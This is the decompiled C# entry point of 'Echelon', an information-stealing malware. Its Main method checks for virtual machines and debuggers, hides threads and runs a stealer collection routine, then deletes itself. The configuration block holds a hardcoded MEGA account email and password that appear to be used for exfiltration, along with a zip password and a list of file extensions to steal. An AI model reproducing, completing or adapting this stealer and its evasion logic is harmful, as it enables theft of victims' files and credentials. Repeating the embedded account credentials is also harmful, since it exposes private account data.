using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using Echelon.Global;
using Echelon.Global.Protect;
using Echelon.Stealer;

namespace Echelon
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002048 File Offset: 0x00000248
		[STAThread]
		private static void Main()
		{
			if (Program.AntiVM)
			{
				VMcheck.CheckAnti();
			}
			if (Program.AntiDebugger)
			{
				Program.<>c__DisplayClass0_0 CS$<>8__locals1 = new Program.<>c__DisplayClass0_0();
				if (AntiDebug.inDebugger())
				{
					AntiDebug.badExit();
				}
				Program.<>c__DisplayClass0_0 CS$<>8__locals2 = CS$<>8__locals1;
				Task[] array = new Task[1];
				array[0] = new Task(delegate()
				{
					AntiDebug.StartAn();
				});
				CS$<>8__locals2.dd = array;
				new Thread(delegate()
				{
					Task[] dd = CS$<>8__locals1.dd;
					for (int i = 0; i < dd.Length; i++)
					{
						dd[i].Start();
					}
				}).Start();
				DebugProtect3.HideOSThreads();
			}
			if (!File.Exists(Help.LocalData + "\\" + Help.HWID))
			{
				Collection.GetCollection();
			}
			else if (!File.ReadAllText(Help.LocalData + "\\" + Help.HWID).Contains(Help.HWID + Help.dateLog))
			{
				Collection.GetCollection();
			}
			else if (Program.doubleExecute)
			{
				Collection.GetCollection();
			}
			else
			{
				Environment.Exit(0);
			}
			Clean.selfRemove();
			Environment.Exit(0);
		}

		// Token: 0x04000001 RID: 1
		public static string megaLOGIN = "imromq123@gmail.com";

		// Token: 0x04000002 RID: 2
		public static string megaPass = "230808ra";

		// Token: 0x04000003 RID: 3
		public static bool AntiVM = true;

		// Token: 0x04000004 RID: 4
		public static bool VM_fakemessage = true;

		// Token: 0x04000005 RID: 5
		public static bool AntiDebugger = true;

		// Token: 0x04000006 RID: 6
		public static bool debugExit = false;

		// Token: 0x04000007 RID: 7
		public static bool selfDelete = false;

		// Token: 0x04000008 RID: 8
		private static bool doubleExecute = true;

		// Token: 0x04000009 RID: 9
		public static string passwordzip = "PASS1234";

		// Token: 0x0400000A RID: 10
		public static int sizefile = 10500000;

		// Token: 0x0400000B RID: 11
		public static bool enableGrab = false;

		// Token: 0x0400000C RID: 12
		public static string[] expansion = new string[]
		{
			".txt",
			".rdp",
			".suo",
			".config",
			".cs",
			".csproj",
			".tlp",
			".sln"
		};
	}
}
